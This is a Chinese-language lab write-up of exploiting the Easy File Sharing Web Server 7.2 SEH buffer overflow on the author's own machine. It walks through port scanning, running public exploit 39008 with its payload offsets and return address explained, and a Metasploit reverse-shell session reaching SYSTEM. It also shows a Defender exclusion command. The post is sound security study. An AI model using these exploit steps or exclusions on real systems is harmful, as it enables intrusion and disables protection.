---
layout: post
title: "EFSS 缓冲区溢出：从扫描到拿到会话"
date: 2026-11-10
categories: 实验
---

这台靶机是我自己电脑上装的 Easy File Sharing Web Server（后面简称 EFSS）。它会在 80 端口开一个网页服务，别人用浏览器就能上传下载文件。

这个漏洞我打了两遍，分成两个实验写：

- 实验一用漏洞库里的公开脚本打，效果是靶机上弹出计算器，能证明代码被执行了。
- 实验二用 Metasploit 对同一个漏洞再打一遍，效果是拿到一个能持续敲命令的会话。

打之前先得摸清靶机的情况，所以前面加了一段准备工作。

所有操作都在自己的机器上做，靶机是本机的软件，攻击机是虚拟机里的 Kali。

## 环境

| 项目 | 说明 |
|---|---|
| 攻击机 | Kali 虚拟机，`192.168.200.131` |
| 靶机 | 本机 Windows 上的 EFSS，`192.168.5.6` |
| 工具 | curl、nmap、searchsploit、python2、Metasploit |

Windows 上的地址用 `ipconfig` 看，Kali 上用 `ip a` 看。换 WiFi 之后靶机地址会变，我这台就从 `10.34.2.99` 变成过 `192.168.5.6`，所以每次开始前都要重新确认一遍。

---

# 准备工作：扫描和找漏洞

## 先用 curl 看服务在不在

```bash
curl -I http://192.168.5.6/
```

`-I` 是只要响应头，不下载网页正文，返回很快。

```
HTTP/1.0 200 OK
Content-Length: 2087
Content-Type: text/html
Server: Easy File Sharing Web Server v6.9
```

看到 `200 OK` 说明服务活着，最后一行 `Server` 直接写明了产品名和版本。

![图1：返回 200，Server 一行写着 EFSS v6.9](截图/01.png)

第一次跑的时候卡了 21 秒才超时，原因是靶机地址变了，换了 WiFi。重新 `ipconfig` 拿到新地址就好了。

## 用 nmap 扫端口

```bash
nmap -sT -sV -p 80 192.168.5.6
```

`-sV` 是探测服务版本，`-sT` 是用完整 TCP 连接扫描。

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Easy File Sharing Web Server httpd 6.9
Service Info: OS: Windows
```

![图2：80 端口开放，识别出服务和系统](截图/02.png)

再扫一遍全端口，看这台机器还开着什么：

```bash
nmap -sT -p- 192.168.5.6
```

结果是 80、135、139、443、445、912、1024、8082。其中 135、139、445 是 Windows 的 RPC 和 SMB，说明这是一台完整的 Windows 主机。

![图3：全端口扫描结果](截图/03.png)

## 扫出来是 filtered

第一次扫，结果是：

```
80/tcp filtered http
```

`filtered` 在 nmap 里的意思是包发出去没收到回应，看上去像被防火墙挡了。但我用 curl 明明能访问，所以不是防火墙。

原因是这个服务是单线程的。nmap 做版本探测时会连着发好几个连接、试不同的探针，它一次只能处理一个，后面的连接就被丢掉，nmap 收不到回应就判成 filtered。

换成 `-sT` 一条一条连，或者用 `curl -I` 单独验证一次，就能确认端口其实是开的。

## 用 searchsploit 找对应的脚本

```bash
searchsploit Easy File Sharing
```

返回一长串，挑版本号对得上的：

```
Easy File Sharing Web Server 7.2 - Buffer Overflow          | windows/remote/39008.py
Easy File Sharing Web Server 7.2 - (HEAD) Buffer Overflow   | windows/remote/39009.py
Easy File Sharing Web Server 7.2 - Remote Buffer Overflow (SEH) | windows/remote/42165.py
Easy File Sharing Web Server 7.2 - Denial of Service        | windows/dos/44522.txt
```

![图4：搜索结果，前面是编号，后面是脚本路径](截图/04.png)

带 `Remote` 的可以远程利用；带 `SEH` 的说明利用的是异常处理机制；带 `DoS` 的只能让服务崩溃，拿不到控制权。

## 版本号对不上

`Server` 那一行写的是 6.9，可漏洞库里全是 7.2 的。如果按 6.9 去搜，什么都找不到。

去看靶机上 `fsws.exe` 的文件属性，版本是 `7.2.0.0`，安装包叫 `efssetup_20181.exe`。也就是说程序换了版本，但 HTTP 头里那句话厂商一直没改。

所以判断版本要以文件版本和安装包为准，banner 只能当参考。

准备工作到此拿到三样东西：靶机地址、开放的端口、能用的漏洞脚本（39008）。下面两个实验都基于这些。

---

# 实验一：用公开脚本打，弹出计算器

## 这个漏洞是怎么回事

EFSS 处理网址时，会把路径那一段复制到内存里一块固定大小的地方，但不检查长度。C 语言里这种写法很常见：

```c
char buff[4096];
strcpy(buff, user_input);
```

`buff` 只有 4096 字节，如果发一个 8000 字节的路径过去，多出来的部分就会写到这块内存后面。那里面存着程序出错时该跳到哪儿的地址。

把这个地址改成我们自己的，程序就会跳到我们指定的地方去执行。这就是缓冲区溢出。

## 用现成的脚本

准备工作里找到的 39008 就是打这个漏洞的。先把它拷到当前目录：

```bash
searchsploit -m windows/remote/39008.py
```

然后运行，参数是靶机地址和端口：

```bash
python2 39008.py 192.168.5.6 80
```

注意必须用 `python2`。这个脚本是 2010 年写的，用 python3 跑会报 `Missing parentheses in call to 'print'` 和 `No module named 'httplib'`，因为 `print` 的写法和 `httplib` 这个模块都是 Python2 的。

## 计算器弹出来了

脚本跑完，终端打印 `Done...`，然后靶机的桌面上弹出了一个计算器。

![图5：脚本执行完，靶机上弹出计算器](截图/05.png)

计算器是靶机上真正运行起来的程序，不是我这台机器的。它能弹出来，说明我发过去的字节在靶机上变成了指令。

选计算器是因为它无害又看得见。把这段代码换成别的，弹出来的就是别的程序。

## 杀软把靶机程序删了

第一次溢出其实成功了，计算器也弹出来了。正准备截图，发现靶机上的 `fsws.exe` 不见了，桌面上的快捷方式也没了。

Windows 安全中心的记录是：

```
事件 ID 1116：行为监控发现恶意行为
威胁名称：Behavior:Win32/Meterpreter.gen!D
动作：隔离并删除源文件
```

一开始没想通：我在打漏洞，被删的怎么是被攻击的那个程序。

原因是 Defender 的行为监控看的是进程在干什么。shellcode 执行之后，`fsws.exe` 出现了在栈上执行代码、准备往外连接这类行为，它分不清这是被利用的受害者还是本身就是木马，就一并删掉了。

结果是溢出成功了，但程序被删，后面的会话也维持不住。

解决办法是先把这个目录加到排除里，再重装一遍软件：

```powershell
Add-MpPreference -ExclusionPath "C:\EFS Software"
```

这条要用管理员权限的 PowerShell 跑。加完排除重装，再打就正常了。

## 脚本里那几个数字是什么

这一部分我看了比较久，简单记一下。

```python
buff  = "A" * 4061              # 填到 SEH 节点前面
next  = "\xeb\x0A\x90\x90"      # Next SEH
seh   = "\x98\x97\x01\x10"      # 处理函数指针
nops  = "\x90" * 19             # NOP 滑板
shell = shellcode               # WinExec("calc")
```

**4061** 是缓冲区开头到 SEH 节点的距离，填这么多个 A 正好停在节点前面。

**`\x98\x97\x01\x10`** 按小端序读是 `0x10019798`，这个地址在 ImageLoad.dll 里，那里有一条 `pop pop ret` 指令。异常发生时系统用 `call [SEH指针]` 调用处理函数，先弹掉栈上两个值，再 `ret`，弹出的就是 Next SEH 的内容，执行流就跳到我们写过的地方。

**`\xeb\x0A`** 是 `jmp +10`。Next SEH 后面接着 4 字节的指针，再往后才是滑板，跳 10 字节正好越过指针。

**`\x90`** 是 NOP，什么都不做，作用是容错。执行流落到滑板范围内任意位置，都会一路走到 shellcode。

这个软件之所以还能打，是因为它的 PE 头里 `DllCharacteristics` 是 `0x0000`，DEP 和 ASLR 都没开。栈可以执行，模块地址固定，脚本里写死的地址一直有效。

## 实验一小结

脚本能弹计算器，说明漏洞是真的，代码也确实执行了。但它只执行了我们写死的那一小段，弹完就没下文了，没法继续操作靶机。

要在靶机上敲命令，得用一个能建立通道的工具，这就有了实验二。

---

# 实验二：用 Metasploit 再做一遍

同一个漏洞、同一个端口，只是把攻击脚本换成 Metasploit 里的现成模块。它的好处是打完之后会顺手建一个会话，能持续在里面敲命令。

## 启动并搜模块

```bash
msfconsole
```

![图6：启动 msfconsole](截图/06.png)

先搜模块：

```
search EasyFileSharing
```

出来两条，选 SEH 那条，和 39008 是同一个漏洞。

![图7：两个模块，下面是路径](截图/07.png)

```
use exploit/windows/http/easyfilesharing_seh
```

![图8：加载模块](截图/08.png)

## 填参数

```
set RHOSTS 192.168.5.6
set LHOST 192.168.200.131
set LPORT 4444
```

![图9：三个参数，RHOSTS 是靶机，LHOST 是本机](截图/09.png)

`RHOSTS` 是靶机地址，`LHOST` 是让靶机回连到哪个地址，所以必须填 Kali 自己的地址。

## LHOST 填成了靶机

第一次我把 `LHOST` 也填成了 `192.168.5.6`，执行时报错：

```
[-] Handler failed to bind to 192.168.5.6:4444
```

`bind` 是在本地开端口监听。填成靶机地址，等于让本机去绑一个不属于自己的地址，当然绑不上。

![图10：报错信息，绑不上 192.168.5.6](截图/10.png)

改成 `set LHOST 192.168.200.131`，也就是 Kali 的地址。

## 改完还是不通

改完 LHOST 还是连不上。原因是 VMware 的虚拟网络编辑器里，VMnet8 的「将主机虚拟适配器连接到此网络」没有勾选。

不勾的话，Windows 主机上就没有 `192.168.200.1` 这个地址。从 Kali 打靶机是通的，但靶机的反弹包回不到 Kali。

判断方法就是两边互相 ping：

```
Kali 上：ping 192.168.5.6          → 通
Windows 上：ping 192.168.200.131   → 不通
```

只有一边通，结果就是溢出能打过去，反弹连不回来。

在 VMware 里勾上那个选项，主机就多出一个 `VMware Network Adapter VMnet8: 192.168.200.1`，ping 通之后再 `exploit` 就好了。

## 拿到会话

```
[+] Exploit Sent
[*] Sending stage (199238 bytes) to 192.168.5.6
[*] Meterpreter session 2 opened (192.168.200.131:4444 -> 192.168.200.1:7909)
meterpreter >
```

![图11：会话建立，出现 meterpreter 提示符](截图/11.png)

出现 `meterpreter >` 就说明拿到了控制权，后面敲的命令都在靶机上执行。

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

`SYSTEM` 是 Windows 上权限最高的账户。

## 实验二小结

和实验一相比，多了一路反弹连接：靶机上的 shellcode 执行后主动连回 Kali 的 4444 端口，Metasploit 收到之后再下发一段更大的主模块，所以体积比实验一的 shellcode 大得多。

这条通道建立起来之后才能录屏、翻文件、截图，实验一那一下弹计算器做不到这些。

## 总结

同一个漏洞做了两遍。第一遍用公开脚本弹计算器，证明代码能执行；第二遍用 Metasploit 拿会话，证明能持续控制。两次之间夹了一个杀软删文件的插曲。

几点想法：

- **`filtered` 不等于防火墙。** 这个服务是单线程的，nmap 做版本探测时并发发好几个连接，后面的被丢掉，看起来就像被挡。判断端口开没开，最好换一种方式交叉验证一次。
- **banner 不能当版本依据。** HTTP 头写 6.9，实际文件是 7.2，厂商只是没改那句话。搜漏洞前先看文件版本和安装包。
- **2010 年的脚本，2026 年还能打通。** 原因是 PE 头里 `DllCharacteristics` 是 `0x0000`，DEP 和 ASLR 都没开，栈可执行、模块地址固定，脚本里写死的地址就一直有效。这两项一旦开着，得先找绕过，难度完全不同。
- **先弹计算器、再拿会话，这个顺序有道理。** 弹计算器只证明「代码被执行了」，风险最小；拿会话要维持一条稳定通道，还会被行为监控盯上。
- **同一个漏洞，工具不同，结果差很多。** 脚本是发一次请求就结束，Metasploit 是多阶段的：先送一小段建立连接，再下发主模块。所以实验二能拿到 shell，实验一只能弹个窗口。

踩过的坑：

| 现象 | 原因 | 解决 |
|---|---|---|
| nmap 把 80 测成 `filtered` | 服务单线程，并发探测被丢 | 改 `-sT -sV`，再用 `curl -I` 交叉验证 |
| `curl` 卡 21 秒后超时 | 换了 WiFi，靶机地址变了 | `ipconfig` 重新取地址 |
| `Handler failed to bind` | `LHOST` 填成了靶机地址 | 填 Kali 自己的地址 |
| `fsws.exe` 和快捷方式消失 | Defender 行为监控删文件 | 加排除目录后重装 |
| 改完 LHOST 还是连不回来 | VMnet8 没勾「连接主机虚拟适配器」 | 勾选后主机得到 `192.168.200.1` |

---

## 用到的命令

- `curl -I 地址`：只看响应头，判断服务活不活
- `nmap -sT -sV -p 80`：单线程服务要用 `-sT`
- `nmap -sT -p-`：扫全部端口
- `searchsploit 关键词`：在漏洞库里按产品名搜
- `searchsploit -m 脚本路径`：把脚本拷到当前目录
- `python2 39008.py 靶机IP 端口`：实验一，执行攻击
- `use exploit/windows/http/easyfilesharing_seh`：实验二，Metasploit 里对应的模块
- `set RHOSTS / LHOST / LPORT`：靶机地址、本机地址、监听端口
